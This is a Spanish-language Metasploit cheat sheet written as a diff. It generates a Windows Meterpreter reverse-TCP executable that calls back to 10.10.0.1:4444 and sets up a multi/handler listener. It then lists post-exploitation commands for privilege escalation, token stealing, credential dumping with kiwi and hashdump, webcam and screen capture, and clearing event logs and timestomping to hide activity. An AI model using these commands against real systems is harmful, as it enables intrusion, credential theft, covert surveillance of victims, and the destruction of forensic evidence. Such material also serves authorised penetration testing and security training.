@@ -1,1 +1,96 @@
+# Genareación del Payload (Windows 11/Windows 10/Windows 7)
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f exe -o reverse.
 
+---------------------------------------------------------------------------------------------------------------------------------
+
+# MSFconsole (Listener)
+use exploit/multi/handler [TYPE]
+set payload windows/x64/meterpreter/reverse_tcp [PAYLOAD]
+set LHOST 10.10.0.1 [IP_ADDRESS]
+set LPORT 4444 [PORT]
+exploit -j [RUN MULTIPLE PAYLOADS IN BACKGROUND]
+
+# MeterpreterSession
+
+sessions -l [LIST SESSIONS]
+sessions -i [SESSION NUMBER]
+sessions -K [KILL SESSION]
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# Meterpreter Commands (System Information)
+
+help → Muestra todos los comandos disponibles.
+sysinfo → Muestra información del sistema (SO, arquitectura, etc.).
+getuid → Muestra el usuario actual (equivalente a whoami).
+getpid → Muestra el ID del proceso actual.
+getenv → Muestra variables de entorno del sistema.
+
+# Meterpreter Commands (Processes)
+
+ps → Lista todos los procesos en ejecución en el sistema.
+migrate <PID> → Mueve la sesión de Meterpreter a otro proceso.
+kill <PID> → Finaliza un proceso específico.
+execute → Ejecuta un programa o comando en el sistema remoto.
+run → Ejecuta módulos o scripts internos de Meterpreter.
+
+# Meterpreter Commands (File System)
+
+pwd → Muestra el directorio actual.
+ls → Lista archivos y carpetas del directorio actual.
+cd → Cambia de directorio.
+cat → Muestra el contenido de un archivo.
+rm → Elimina archivos.
+mkdir → Crea un directorio.
+search → Busca archivos en el sistema.
+download → Descarga archivos desde la máquina víctima.
+upload → Sube archivos a la máquina víctima.
+
+# Meterpreter Commands (Network)
+
+ipconfig / ifconfig → Muestra la configuración de red del sistema.
+route → Muestra la tabla de rutas de red.
+portfwd → Redirige puertos entre la máquina atacante y la víctima.
+netstat → Muestra conexiones de red activas.
+
+# Meterpreter Commands (Session Control)
+
+shell → Abre una terminal del sistema remoto.
+background → Envía la sesión actual a segundo plano.
+sessions → Muestra todas las sesiones activas.
+sessions -l → Lista sesiones disponibles.
+sessions -i <id> → Interactúa con una sesión específica.
+
+# Meterpreter Commands (Privileges)
+
+getsystem → Intenta escalar privilegios a administrador.
+getprivs → Muestra los privilegios actuales del usuario.
+rev2self → Vuelve al usuario original de la sesión.
+steal_token → Roba tokens de autenticación de otros procesos.
+
+# Meterpreter Commands (Credentials / Kiwi)
+
+load kiwi → Carga el módulo para extracción de credenciales.
+creds_all → Muestra todas las credenciales disponibles.
+lsa_dump_sam → Extrae hashes de usuarios del sistema.
+lsa_dump_secrets → Extrae secretos del sistema.
+hashdump → Extrae hashes de contraseñas de usuarios.
+
+# Meterpreter Commands (Camera & Screen)
+
+screenshot → Captura la pantalla del sistema remoto.
+webcam_list → Lista cámaras disponibles.
+webcam_snap → Toma una foto con la webcam.
+webcam_stream → Transmite video en vivo desde la webcam.
+
+# Meterpreter Commands (Cleaning / Evasion)
+
+clearev → Borra registros de eventos de Windows.
+timestomp → Modifica fechas de archivos para ocultar actividad.
+
+# Meterpreter Commands (Misc)
+
+idletime → Muestra el tiempo de inactividad del usuario.
+enumdesktops → Lista escritorios activos.
+uictl → Controla dispositivos de entrada (teclado/ratón en algunos casos).
+exit → Cierra la sesión de Meterpreter.
